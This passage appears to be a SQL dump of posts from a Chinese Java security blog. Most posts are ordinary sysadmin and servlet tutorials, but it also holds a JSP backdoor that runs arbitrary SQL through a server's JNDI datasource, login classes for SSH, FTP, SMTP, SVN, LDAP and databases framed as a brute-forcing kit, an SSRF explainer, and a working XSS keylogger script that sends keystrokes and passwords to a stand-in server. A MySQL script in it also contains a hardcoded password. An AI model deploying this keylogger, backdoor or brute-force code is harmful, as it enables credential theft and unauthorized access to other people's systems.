binary\nor one of the libraries it was linked against is corrupt, improperly built,\nor misconfigured. This error can also be caused by malfunctioning hardware.\nWe will try our best to scrape up some info that will hopefully help\ndiagnose the problem, but since we have already crashed,\nsomething is definitely wrong and this may fail.\n&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;nbsp;\nkey_buffer_size=8384512\nread_buffer_size=131072\nmax_used_connections=0\nmax_threads=151\nthread_count=0\nconnection_count=0\nIt is possible that mysqld could use up to\nkey_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 338332 K  bytes of memory\nHope that&#039;s ok; if not, decrease some variables in the equation.\nThread pointer: 0x0\nAttempting backtrace. You can use the following information to find out\nwhere mysqld died. If you see no messages after this, something went\nterribly wrong...\nstack_bottom = 0 thread_stack 0x40000\n/usr/libexec/mysqld(my_print_stacktrace+0x29) [0x84f539]\n/usr/libexec/mysqld(handle_fatal_signal+0x483) [0x6a3713]\n/lib64/libpthread.so.0(+0xf500) [0x7f37fa944500]\nThe m131103 11:26:49 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended</pre>\n<p>看起来是InnerDB异常关闭的问题，网上搜索找到解决方案：</p>\n<p><ul></p>\n<p>	<li>cd /var/lib/mysql</li></p>\n<p>	<li>mkdir old</li></p>\n<p>	<li>mv ib* old</li></p>\n<p>	<li>/etc/init.d/mysql start</li></p>\n<p></ul></p>\n<p>总结：最好还是正常等待mysql关闭吧，实在不行，再看这篇文章</p>', null, '2013-12-05 11:25:06', '1', '955', null, '0', '2013-12-05 11:25:06');
INSERT INTO `sys_posts` VALUES ('199', '2', '9', 'Linux下恢复rm删除的文件 (CentOS)', 'blue', '今天误删除了Centos服务器上的某个文件夹，找了下恢复，ext3grep，extundelete等，因为文件系统是ext4的，只能使用extundelete\n<p>1. 安装依赖</p>\n<pre>yum -y install e2fsprogs e2fsprogs-devel</pre>\n2. 去<a href=\"http://extundelete.sourceforge.net/\" rel=\"nofollow\">http://extundelete.sourceforge.net/</a>下载extundelete-0.2.4.tar.bz2并安装\n<pre>tar -xjf extundelete-0.2.4.tar.bz2\ncd extundelete-0.2.4\n./configure\nmake\nmake install</pre>\n<p>3. 恢复</p>\n<p>extundelete /dev/***(挂载的硬盘) –restore-all  （可以先df一下确认下删除的文件夹所在的硬盘）</p>\n<p>4. 去当前目录RECOVERED_FILES下查看恢复的文件吧</p>', null, '2013-12-05 11:26:44', '1', '731', null, '0', '2013-12-05 11:26:54'), ('202', '5', '13', 'Apache Roller博客Struts2命令执行漏洞', 'Anonymous', '在exp有个Apache Roller OGNL Injection：http://www.exploit-db.com/exploits/29859/ 好牛B的感觉，下载了几个Apache Roller的版本，好吧。\n<pre class=\"brush: java; gutter: true\">roller5.00:struts2-core-2.2.1.jar\nroller5.01:struts2-core-2.2.3.1.jar</pre>\n<p>剩下的不许多少Struts getshell，原来老外也喜欢刷CVE.</p>', null, '2013-12-05 17:04:47', '1', '522', null, '0', '2014-03-24 11:33:57'), ('216', '1', '12', '无需数据库密码-JNDI数据源方式执行Sql语句', '园长', '如果只找到数据源的情况下可以直接用数据源的名连接数据库，不需要找到具体的密码。\n<pre class=\"brush: java; gutter: true\">&lt;%@page import=&quot;java.io.File&quot;%&gt;\n&lt;%@page import=&quot;java.io.FileWriter&quot;%&gt;\n&lt;%@page import=&quot;java.io.BufferedWriter&quot;%&gt;\n&lt;%@ page contentType=&quot;text/html;charset=gb2312&quot;%&gt;\n&lt;%@ page import=&quot;java.sql.*&quot;%&gt;\n&lt;%@ page import=&quot;javax.sql.*&quot;%&gt;\n&lt;%@ page import=&quot;javax.naming.*&quot;%&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;!-- \n使用方法:修改java:comp/env/jdbc/tfms为你自己的数据源名字\n		请求http://xxx.com/xxx.jsp?sql=select xxx  from xxx即可\n --&gt;\n&lt;pre&gt;\n	&lt;%\n		Context ctx = new InitialContext();\n		Connection conn = null;\n		ctx = new InitialContext();\n		DataSource ds = (DataSource) ctx.lookup(&quot;java:comp/env/jdbc/tfms&quot;);\n		conn = ds.getConnection();\n		Statement stmt = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);\n		String sql = request.getParameter(&quot;sql&quot;);\n		ResultSet rs = stmt.executeQuery(sql);\n		ResultSetMetaData d = rs.getMetaData();\n		BufferedWriter bw = new BufferedWriter(new FileWriter(new File(request.getSession().getServletContext().getRealPath(&quot;/&quot;)+&quot;back-db.txt&quot;),true));\n		for (int i = 1; i &lt;= d.getColumnCount(); i++) {\n			out.println(d.getColumnName(i) + &quot; (&quot; + d.getColumnTypeName(i)+ &quot;)\\t&quot;);\n		}\n		out.println(&quot;&lt;br/&gt;&quot;);\n		while (rs.next()) {\n			for (int i = 1; i &lt;= d.getColumnCount(); i++) {\n				out.println(rs.getObject(d.getColumnName(i)));\n			}\n			out.println(&quot;&lt;br/&gt;&quot;);\n		}\n	%&gt;\n	&lt;%\n		rs.close();\n		stmt.close();\n		conn.close();\n	%&gt;\n&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;</pre>', null, '2013-12-05 19:05:43', '1', '551', null, '0', '2014-03-25 23:06:42'), ('229', '5', '3', 'servlet中使用HttpServletResponseWrapper截获返回的页面内容', 'Anonymous', '[转载声明] 转载时必须标注：本文来源于铁木箱子的博客http://www.mzone.cc\n<p>[本文地址] 本文永久地址是：<a href=\"http://www.mzone.cc/article/260.html\">http://www.mzone.cc/article/260.html</a></p>\n<p>像标题所说的，虽然在在JEE开发中并不常见，但也不是没有需要。比如知名的页面装饰框架sitemesh，就是利用filter过滤器先截获返回给客户端的页面，然后分析html代码并最终装饰页面效果后返回给客户端。我这里也先简单的说下如何来自己编程实现，然后说一个我遇到的问题，应该也是大家会遇到但很难找到原因的问题。</p>\n<p>要截获页面返回的内容，整体的思路是先把原始返回的页面内容写入到一个字符Writer，然后再组装成字符串并进行分析，最后再返回给客户端。代码如下：</p>\n<pre class=\"brush: java; gutter: true\">package cc.mzone.test;\nimport java.io.CharArrayWriter;\nimport java.io.PrintWriter;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpServletResponseWrapper;\n/**\n * 自定义一个响应结果包装器，将在这里提供一个基于内存的输出器来存储所有\n * 返回给客户端的原始HTML代码。\n * \n * @author 铁木箱子\n *\n */\npublic class ResponseWrapper extends HttpServletResponseWrapper {\n	private PrintWriter cachedWriter;\n	private CharArrayWriter bufferedWriter;\n	public ResponseWrapper(HttpServletResponse response) {\n		super(response);\n		// 这个是我们保存返回结果的地方\n		bufferedWriter = new CharArrayWriter();\n		// 这个是包装PrintWriter的，让所有结果通过这个PrintWriter写入到bufferedWriter中\n		cachedWriter = new PrintWriter(bufferedWriter);\n	}\n	@Override\n	public PrintWriter getWriter() {\n		return cachedWriter;\n	}\n	/**\n	 * 获取原始的HTML页面内容。\n	 * @return\n	 */\n	public String getResult() {\n		return bufferedWriter.toString();\n	}\n}</pre>\n<pre class=\"brush: java; gutter: true\"></pre>\n<pre class=\"brush: java; gutter: true\">然后再写一个过滤器来截获内容并处理：</pre>\n<pre class=\"brush: java; gutter: true\">package cc.mzone.test;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.Filter;\nimport javax.servlet.FilterChain;\nimport javax.servlet.FilterConfig;\nimport javax.servlet.ServletException;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpServletResponse;\npublic class MyServletFilter implements Filter {\n	@Override\n	public void destroy() {\n		// TODO Auto-generated method stub\n	}\n	@Override\n	public void doFilter(ServletRequest request, ServletResponse response,\n			FilterChain chain) throws IOException, ServletException {\n		// 使用我们自定义的响应包装器来包装原始的ServletResponse\n		ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);\n		// 这句话非常重要，注意看到第二个参数是我们的包装器而不是response\n		chain.doFilter(request, wrapper);\n		// 处理截获的结果并进行处理，比如替换所有的“名称”为“铁木箱子”\n		String result = wrapper.getResult();\n		result = result.replace(&quot;名称&quot;, &quot;铁木箱子&quot;);\n		// 输出最终的结果\n		PrintWriter out = response.getWriter();\n		out.write(result);\n		out.flush();\n		out.close();\n	}\n	@Override\n	public void init(FilterConfig filterConfig) throws ServletException {\n		// TODO Auto-generated method stub\n	}\n}</pre>\n<pre class=\"brush: java; gutter: true\"></pre>\n<pre class=\"brush: java; gutter: true\"> 然后将该servlet配置在web.xml文件中，如下：</pre>\n<pre class=\"brush: xml; gutter: true\">&lt;filter&gt;\n    &lt;filter-name&gt;myFilter&lt;/filter-name&gt;\n    &lt;filter-class&gt;cc.mzone.test.MyServletFilter&lt;/filter-class&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;myFilter&lt;/filter-name&gt;\n    &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;</pre>\n<pre class=\"brush: java; gutter: true\"></pre>\n<pre class=\"brush: java; gutter: true\">     我们上面配置的是只过滤访问后缀为.jsp的url地址，当然你可以根据自己的需要修改成其他的过滤模式。然后我们在web应用根目录下建立一个jsp文件test.jsp，内容如下：</pre>\n<pre class=\"brush: java; gutter: true\">&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; contentType=&quot;text/html; charset=UTF-8&quot; %&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;页面返回结果过滤测试&lt;/title&gt;&lt;/head&gt;\n&lt;/head&gt;\n&lt;body&gt;\n你好，我叫“名称”。\n&lt;/body&gt;\n&lt;/html&gt;</pre>\n<p>配置完后，部署到tomcat，然后访问应用下的test.jsp文件，就可以发现返回的内容变成了：</p>\n<pre class=\"brush: actionscript3; gutter: true\">你好，我叫“铁木箱子”</pre>\n而不是页面中原始的内容：\n<pre class=\"brush: actionscript3; gutter: true\">你好，我叫“名称”</pre>\n从而也就达到了我们想要的效果了。在文章开头我也提到了说有一个问题，那就是有可能在运行的过程中页面只输出一部分，尤其是在使用多个框架后(比如sitemesh)出现的可能性非常大，在探究了好久之后终于发现原来是响应的ContentLength惹的祸。因为在经过多个过滤器或是框架处理后，很有可能在其他框架中设置了响应的输出内容的长度，导致浏览器只根据得到的长度头来显示部分内容。知道了原因，处理起来就比较方便了，我们在处理结果输出前重置一下ContentLength即可，如下：\n<pre class=\"brush: java; gutter: true\">// 重置响应输出的内容长度\nresponse.setContentLength(-1);\n// 输出最终的结果\nPrintWriter out = response.getWriter();\nout.write(result);\nout.flush();\nout.close();</pre>\n<pre class=\"brush: java; gutter: true\">      这样处理后就不会再出现只出现部分页面的问题了！</pre>', null, '2013-12-06 14:12:23', '1', '516', null, '1', '2013-12-18 19:12:19'), ('234', '1', '12', 'Java login SSH', '园长', 'Java连接并登陆SSH（需要用到的jar包-<a href=\"http://javaweb.org/wp-content/uploads/2013/12/ganymed-ssh2-build210.jar_.zip\">ganymed-ssh2-build210.jar</a>）：\n<pre class=\"brush: java; gutter: true\">package org.javaweb.util;\nimport java.io.IOException;\nimport ch.ethz.ssh2.Connection;\npublic class Ssh {\n	public boolean login(String host,int port,String user,String password){\n		boolean l = false;\n		try {\n			Connection conn = new Connection(host, port);\n			conn.connect();\n			l = conn.authenticateWithPassword(user, password);\n			conn.close();\n		} catch (IOException e) {\n			System.out.println(e.toString());\n		}\n		return l;\n	}\n}</pre>', null, '2013-12-07 12:43:30', '1', '508', null, '0', '2013-12-07 12:47:56'), ('236', '1', '12', 'Java login smtp', '园长', 'Java登陆邮箱（需要的jar包-<a href=\"http://javaweb.org/wp-content/uploads/2013/12/mail.jar_.zip\">mail.jar</a>）：\n<pre class=\"brush: java; gutter: true\">package org.javaweb.util;\nimport java.util.Properties;\nimport javax.mail.Session;\nimport javax.mail.Transport;\npublic class Mail {\n	public boolean login(String host, int port, String user, String password) {\n		try {\n			Properties props = new Properties();\n			props.setProperty(&quot;mail.smtp.auth&quot;, &quot;true&quot;);\n			props.setProperty(&quot;mail.transport.protocol&quot;, &quot;smtp&quot;);\n			Session session = Session.getInstance(props);\n			Transport transport = session.getTransport();\n			transport.connect(host, port, user,password);\n			transport.close();\n			return true;\n		} catch (Exception e) {\n			System.out.println(e.toString());\n			return false;\n		}\n	}\n}</pre>', null, '2013-12-07 12:47:14', '1', '519', null, '0', '2013-12-07 12:47:14'), ('241', '1', '12', 'Java爆破SVN、FTP、任何数据库、SMTP、SSH、LDAP。。。', '园长', 'Java有很多开源的项目，用java求连接FTP、数据库、SVN之类的其实都很方便。既然可以很easy的求连接，那么是不是可以简单的改下弄给爆破呢？于是默默的新建了一个名叫“@z7y”的项目......本文只提供方法不提供具体工具实现！\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/17.jpg\"><img class=\"alignnone size-full wp-image-1119\" alt=\"1\" src=\"http://javaweb.org/wp-content/uploads/2013/12/17.jpg\" width=\"1440\" height=\"810\" /></a></p>\n<p>Java连接SSH：</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.util;\nimport java.io.IOException;\nimport ch.ethz.ssh2.Connection;\npublic class Ssh {\n	public static boolean login(String host,int port,String user,String password){\n		boolean l = false;\n		try {\n			Connection conn = new Connection(host, port);\n			conn.connect();\n			l = conn.authenticateWithPassword(user, password);\n			conn.close();\n		} catch (IOException e) {\n			System.out.println(e.toString());\n		}\n		return l;\n	}\n}</pre>\n<p>Java连接Svn:</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.util;\nimport org.tmatesoft.svn.core.SVNException;\nimport org.tmatesoft.svn.core.SVNURL;\nimport org.tmatesoft.svn.core.auth.ISVNAuthenticationManager;\nimport org.tmatesoft.svn.core.io.SVNRepository;\nimport org.tmatesoft.svn.core.io.SVNRepositoryFactory;\nimport org.tmatesoft.svn.core.wc.SVNWCUtil;\npublic class Svn {\n    @SuppressWarnings(&quot;deprecation&quot;)\n	public static boolean login(String url,String user,String pass){\n        SVNRepository repository = null;\n        try {\n            repository = SVNRepositoryFactory.create(SVNURL.parseURIDecoded(url));\n            ISVNAuthenticationManager authManager = SVNWCUtil.createDefaultAuthenticationManager(user,pass);\n            repository.setAuthenticationManager(authManager);\n            repository.testConnection();\n            return true;\n        } catch (SVNException e) {\n            System.out.println(e.toString());\n        }\n        return false;\n    }\n}</pre>\n<p>Java连接SMTP（mail）：</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.util;\nimport java.util.Properties;\nimport javax.mail.Session;\nimport javax.mail.Transport;\npublic class Mail {\n	public static boolean login(String host, int port, String user, String password) {\n		try {\n			Properties props = new Properties();\n			props.setProperty(&quot;mail.smtp.auth&quot;, &quot;true&quot;);\n			props.setProperty(&quot;mail.transport.protocol&quot;, &quot;smtp&quot;);\n			Session session = Session.getInstance(props);\n			Transport transport = session.getTransport();\n			transport.connect(host, port, user,password);\n			transport.close();\n			return true;\n		} catch (Exception e) {\n			System.out.println(e.toString());\n			return false;\n		}\n	}\n}</pre>\n<p>Java连接FTP:</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.util;\nimport org.apache.commons.net.ftp.FTPClient;\npublic class Ftp {\n	public static boolean login(String host, int port, String user,String password) {\n		boolean f = false;\n        try {\n			FTPClient ftpClient = new FTPClient();\n            ftpClient.setConnectTimeout(3000);\n			ftpClient.connect(host);\n			ftpClient.setDefaultPort(port);\n            f = ftpClient.login(user,password);\n            if(ftpClient!=null){\n                ftpClient.logout();\n                ftpClient.disconnect();\n            }\n		} catch (Exception e) {\n            System.out.println(e.toString());\n        }\n		return f;\n	}\n}</pre>\n<p>Java连接数据库（Mysql只是示例，改下驱动的url和包驱动可以连接任何数据库）：</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.util;\nimport java.sql.DriverManager;\npublic class Database {\n	public static boolean login(String driver,String url,String user,String password){\n		try {\n			Class.forName(driver);\n            return DriverManager.getConnection(url, user, password)!=null;\n		} catch (Exception e) {\n            System.out.println(e.toString());\n        }\n		return false;\n	}\n}</pre>\n<p>Java连接LDAP:</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.util;\nimport java.util.Hashtable;\nimport javax.naming.Context;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\npublic class Ldap {\n    private static DirContext ctx;\n    public static boolean login(String host,int port,String root,String user,String password) {\n        Hashtable&lt;String,Object&gt; env = new Hashtable&lt;String, Object&gt;();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);\n        env.put(Context.PROVIDER_URL, &quot;ldap://&quot;+host+&quot;:&quot;+port+&quot;/&quot; + root);\n        env.put(Context.SECURITY_AUTHENTICATION, &quot;simple&quot;);\n        env.put(Context.SECURITY_PRINCIPAL, &quot;cn=&quot;+user );\n        env.put(Context.SECURITY_CREDENTIALS, password);\n        try {\n            ctx = new InitialDirContext(env);\n            ctx.close();\n            return true;\n        }catch (Exception e) {\n            System.out.println(e.toString());\n        }\n        return false;\n    }\n}</pre>\n<p>测试代码：</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.util;\npublic class Test {\n	public static void main(String[] args) {\n        System.out.println(Ssh.login(&quot;ahack.net&quot;,22,&quot;p2j.cn&quot;,&quot;111111&quot;));\n        System.out.println(Ftp.login(&quot;p2j.cn&quot;,21,&quot;p2j.cn&quot;,&quot;111111&quot;));\n        System.out.println(Mail.login(&quot;smtp.163.com&quot;,25,&quot;p2j@163.com&quot;,&quot;111111&quot;));\n		System.out.println(Database.login(&quot;com.mysql.jdbc.Driver&quot;, &quot;jdbc:mysql://localhost/&quot;, &quot;root&quot;, &quot;111111&quot;));\n        System.out.println(Svn.login(&quot;svn://p2j.cn&quot;,&quot;svn&quot;,&quot;111111&quot;));\n    }\n}</pre>\n<p>下载地址：http://pan.baidu.com/s/1vgVQN</p>\n<p>还有很多有意思的东西都可以试试，比如rdp、radmin、git等，Tomcat也可以爆破，之前发过了这里就不发了吧。</p>', null, '2013-12-07 15:28:12', '1', '591', null, '0', '2014-04-15 14:36:35'), ('259', '1', '17', 'MySQL 数据库日志切割脚本', '园长', '出处： <a href=\"http://netkiller.github.io/\">http://netkiller.github.io/</a>\n<pre class=\"brush: python; gutter: true\">#!/bin/bash\nUSER=backup\nPASS=SaJePoM6BAPOmOFOd7Xo3e1A52vEPE\nLOGDIR=&quot;/tmp/backup&quot;\nDATADIR=&quot;/var/lib/mysql&quot;\nLOG=mysql.log\nLOG_ERROR=mysql_error.log\nLOG_SLOW_QUERIES=slow.log\nSOCKET=&quot;/var/lib/mysql/mysql.sock&quot;\n#Number of copies\nCOPIES=30\nSHARDING=$(date -d &quot;yesterday&quot; +&quot;%Y-%m-%d&quot;)\nmkdir -p ${LOGDIR}/${SHARDING}\nwhile read logfile age\ndo\n    mv ${DATADIR}/$logfile ${LOGDIR}/${SHARDING}\ndone &lt;&lt; EOF\n${LOG}\n${LOG_ERROR}\n${LOG_SLOW_QUERIES}\nEOF\nmysqladmin -u${USER} -p${PASS} --socket=${SOCKET} flush-logs\nfind $LOGDIR -type f -ctime +$COPIES -delete</pre>', null, '2013-12-11 15:16:51', '1', '875', null, '0', '2013-12-11 15:16:51'), ('292', '1', '14', '\"内网漫游\"-web', '园长', '经常在wooyun看到“漫游内网”之类的漏洞，那么这样的漏洞一般是怎么产生的呢？\n<p><strong>Demo1：未经校验的url重定向</strong></p>\n<pre class=\"brush: java; gutter: true\">import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\npublic class wooyun extends HttpServlet {\n	private static final long serialVersionUID = 1L;\n	public void doGet(HttpServletRequest request, HttpServletResponse response)\n			throws ServletException, IOException {\n		doPost(request, response);\n	}\n	public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n		response.sendRedirect(request.getParameter(&quot;url&quot;));\n	}\n}</pre>\n<p>当请求里面带有url=xxxx内网ip的时候server会把请求重定向到对应的地址（请求转发不行，因为转发只能在本应用内）。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/15.jpg\"><img class=\"alignnone size-full wp-image-1112\" alt=\"1\" src=\"http://javaweb.org/wp-content/uploads/2013/12/15.jpg\" width=\"1132\" height=\"558\" /></a></p>\n<p>类似场景：</p>\n<p><h3><a title=\"我是如何漫游搜狗和搜狐内部网络的\" href=\"http://www.wooyun.org/bugs/wooyun-2010-026249\" target=\"_blank\">我是如何漫游搜狗和搜狐内部网络的</a></h3></p>\n<p><h3><a href=\"http://www.wooyun.org/bugs/wooyun-2010-026212\" target=\"_blank\">我是如何漫游腾讯内部网络的</a></h3></p>\n<p><strong>Demo2：文件下载问题</strong></p>\n<p>不得不说某个木JJ的黑阔非常的贱。迅雷等下载工具都流行用一个叫做“离线下载”的功能不得不说某个木JJ的黑阔非常的贱。迅雷等下载工具都流行用一个叫做“离线下载”的功能(这里说的只是一个想法，不代表迅雷有这个问题)，这个功能实际上是一个文件下载代理。当客户端下载一个文件的时候可以同时在服务器端建立一个“离线任务”。这个离线任务其实就是在服务器上下载目标文件，一旦在服务器上下载完成后就把资源共享给本地客户端这样用户可以享受到服务器的高速带宽，下载速度自然就噌噌噌的了。这里其实也存在一个逻辑问题，当服务器拿到目标地址为内网ip的且不进行处理继续下载的话，假如建立一个离线任务地址是：http://192.168.xxx.xxx,云端会访问内网的这个URL，并且下载页面返回结果，就算不返回结果通常也可以通过看返回的状态判定。</p>\n<p>比如：</p>\n<pre class=\"brush: java; gutter: true\">import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.URL;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\npublic class wooyun extends HttpServlet {\n	private static final long serialVersionUID = 1L;\n	public String download(String url){\n		String t = &quot;&quot;,s = &quot;&quot;;\n		try {\n			BufferedReader br = new BufferedReader(new InputStreamReader(new URL(url).openConnection().getInputStream(),&quot;GBK&quot;));\n			while((t=br.readLine())!=null){\n				s+=t+&quot;\\n&quot;;\n			}\n		} catch (Exception e) {\n			e.printStackTrace();\n		}\n		return s;\n	}\n	public void doGet(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException {\n		doPost(request, response);\n	}\n	public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n		request.setCharacterEncoding(&quot;UTF-8&quot;);\n		response.setContentType(&quot;text/html; charset=UTF-8&quot;);\n		PrintWriter out = response.getWriter();\n		out.println(download(request.getParameter(&quot;url&quot;)));\n		out.flush();\n		out.close();\n	}\n}</pre>\n<p>请求会经过服务器发送到内网其他服务器：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2013/12/23.jpg\"><img class=\"alignnone size-full wp-image-1113\" alt=\"2\" src=\"http://javaweb.org/wp-content/uploads/2013/12/23.jpg\" width=\"567\" height=\"504\" /></a></p>\n<p>类似场景：</p>\n<p><h3><a title=\"通过搜狗某搜索功能扫描搜狗内网\" href=\"http://www.wooyun.org/bugs/wooyun-2013-041264\" target=\"_blank\">通过搜狗某搜索功能扫描搜狗内网</a></h3></p>\n<p><strong>如何防御：</strong></p>\n<p>1、限定demo1的跳转地址</p>\n<p>2、处理下载请求时忽略内网IP</p>\n<p>3、在请求或响应的包装类(HttpServletRequestWrapper、HttpServletResponseWrapper)做好危险请求处理</p>\n<p>4、加强开发者的安全意识，做好内网安全工作</p>\n<p>思维扩撒：</p>\n<p>可以枚举内网所有端口和ip进行内网信息刺探，寻求如Struts2、Tomcat等突破口。。。</p>', null, '2013-12-17 15:07:56', '1', '544', null, '0', '2014-04-15 14:33:42'), ('326', '5', '14', '[F4CK-phithon]javascript键盘记录详解，各种浏览器适用', 'Anonymous', '最近在尝试写自己的xss平台，因为对现有的平台还是不够满足。首先就是这个键盘记录功能不好加进去，要加就得改代码，感觉有点麻烦。因为我们的键盘记录是需要持续记录键盘的输入，并持续向我们的服务端发送数据，现有的xss平台每次发送来的数据都会接收一次（而不是更新之前接收过的），就会造成数据的庞大。（不知道xss.tw改进没有，我一直没有哪里的邀请码）\n<p>哦？有同学在问什么是键盘记录了，它跟xss有什么关系。</p>\n<p><strong>0x01 javascript键盘事件</strong></p>\n<p>总所周知，xss漏洞的产生是因为执行了恶意的javascript代码。我们可以通过这个xss获得用户的cookie，但这绝对不是xss仅有的作用。</p>\n<p>试想一下，你有一个很大的discuz论坛的shell，但数据库里很多密码都因为加了salt很难破解（包括管理员的）。如果我挂一个键盘记录的javascript在登陆页面（当然更好的是直接挂抓取密码的js），我就能轻松地获得每个人登陆时候输入的信息。当然，这个例子与xss就没关系了。</p>\n<p>在xss的时候，我们挂的代码中如果也有键盘记录的功能，也能多少获得一些对方的信息，比如对方的打字习惯、对方正在干什么，如果你插的页面正好也有登陆框，也就顺便能打到一些账号密码。实用范围还有很多，大家可以自己发挥想象力。</p>\n<p>javascript代码中有三个事件：onkeydown、onkeyup、onkeypress，分别对应着键盘按下、弹起、按动一个键。有人就问了，有了前两个，press不是很没用。其实press更多的是响应一个可见字符的输入事件，比如我输入一个*号，用前两个事件记录下的按键可能是：“shift”、“8”，而press事件记录下的直接就是“*”。明白什么意思吧。</p>\n<p>因为有了这三个事件，我们只用响应他们就能记录键盘了。</p>\n<p><strong>0x02 浏览器兼容</strong></p>\n<p>javascript代码最大的麻烦就是浏览器兼容，因为不同浏览器可能代码就不一样。现在主流浏览器就是IE、chrome、firefox，我们只要做到了这三个浏览器的兼容，基本上就可以了。</p>\n<p>keyDown等这几个事件都有一个隐藏的参数e，类似这样function onkeydown(e){}，进入响应函数后e其实就是我们这个事件对象，它其中就包括了按下的键，那就是e.keyCode。但是，在IE中又不是这样，IE里获得按下的键是event.keyCode，这个event是一个全局变量。</p>\n<p>所以我们在这里巧妙地处理这个问题：</p>\n<pre class=\"brush: javascript; gutter: true\">var e=e||event;\nvar currKey=e.keyCode||e.which||e.charCode;</pre>\n<p>e||event，当e不存在时返回event，最后结果替代新的e。下面一个类似，当e.keyCode不存在时返回e.which，再不存在就返回e.charCode。最后结果在currKey中。</p>\n<p>0x03 代码编写</p>\n<p>于是我就想了一个思路：我们将用户输入的每个字符都保存在logger这个全局变量里，然后每过10秒（时间长是为了减轻服务器负担），提交一次logger，并清空它。等待下次记录。</p>\n<p>这是我今天晚上写的一个javascript，我已经努力去完善它了，大家还可以拿去尽情发挥：</p>\n<pre class=\"brush: javascript; gutter: true\">(function(){\n        var logger = &quot;&quot;;\n        keyDown = function(e)\n        {\n                var e=e||event;\n                var currKey=e.keyCode||e.which||e.charCode;\n                if((currKey&gt;7&amp;&amp;currKey&lt;32)||(currKey&gt;31&amp;&amp;currKey&lt;47))\n                {\n                   switch(currKey)\n           　  {\n                        case 8: keyName = &quot;[退格]&quot;; break;\n                        case 9: keyName = &quot;[制表]&quot;; break;\n                        case 13:keyName = &quot;[回车]&quot;; break;\n                        //case 16:keyName = &quot;[shift]&quot;; break;\n                        case 17:keyName = &quot;[Ctrl]&quot;; break;\n                        case 18:keyName = &quot;[Alt]&quot;; break;\n                        case 20:keyName = &quot;[大小写]&quot;; break;\n                        case 32:keyName = &quot;[空格]&quot;; break;\n                        case 33:keyName = &quot;[PageUp]&quot;;   break;\n                        case 34:keyName = &quot;[PageDown]&quot;;   break;\n                        case 35:keyName = &quot;[End]&quot;;   break;\n                        case 36:keyName = &quot;[Home]&quot;;   break;\n                        case 37:keyName = &quot;[方向键左]&quot;;   break;\n                        case 38:keyName = &quot;[方向键上]&quot;;   break;\n                        case 39:keyName = &quot;[方向键右]&quot;;   break;\n                        case 40:keyName = &quot;[方向键下]&quot;;   break;\n                        case 46:keyName = &quot;[删除]&quot;;   break;\n                        default:keyName = &quot;&quot;;    break;\n                   }\n                   logger += keyName;\n                }\n        }\n        keyPress = function(e)\n        {\n                var currKey=0,CapsLock=0,e=e||event;\n                currKey=e.keyCode||e.which||e.charCode;\n                CapsLock=currKey&gt;=65&amp;&amp;currKey&lt;=90;\n                switch(currKey)\n                {\n                   　 　 //屏蔽了退格、制表、回车、空格、方向键、删除键等\n                   　 　 case 8: case 9:case 13:case 16:case 17:case 18:case 20:\n                                    case 32: case 33: case 34: case 35: case 36: case 37:case 38:\n                                    case 39:case 40:case 46:keyName = &quot;&quot;;break;\n                   　 　 default:keyName = String.fromCharCode(currKey); break;\n                }\n                logger += keyName;\n        }\n        sendChar = function()\n        {\n                if (!logger) return;\n                (new Image).src=&quot;http://xxxx.com/getChar.php?char=&quot; + logger; //服务端地址\n                logger = &quot;&quot;;\n        }\n        formSubmit = function()\n        {\n                sendChar();\n        }\n        document.onkeydown = keyDown;\n        document.onkeypress = keyPress;\n        document.onsubmit = formSubmit;\n        setInterval(sendChar, 10000); //设置定时器\n})();</pre>\n<p>大家可以看到，我这里面定义了几个函数，一是keyDown，它是在按键按下时响应，我用它来记录一些不可见字符，比如回车、上下左右、退格等。</p>\n<p>二是keyPress，我用它来记录可见字符（因为用它就能直接记录下&amp;*（）这种需要按shift的字符了）。</p>\n<p>三是formSubmit，这里是为了拦截表单的提交消息。因为我们这个脚本是每过10秒发送一次记录的数据，但如果用户输入账号密码的时间很快，5秒就输完了，然后回车提交了，这样我们就什么都没拿到。于是我绑定了一个提交的事件，当用户提交表单的时候，也发送一次。</p>\n<p>四是sendChar，就是我们发送数据的函数。这个函数里用new Image新建了一个图片，图片的地址就是我们的服务端，用get的方式将数据交给服务端即可。</p>\n<p><strong>0x04 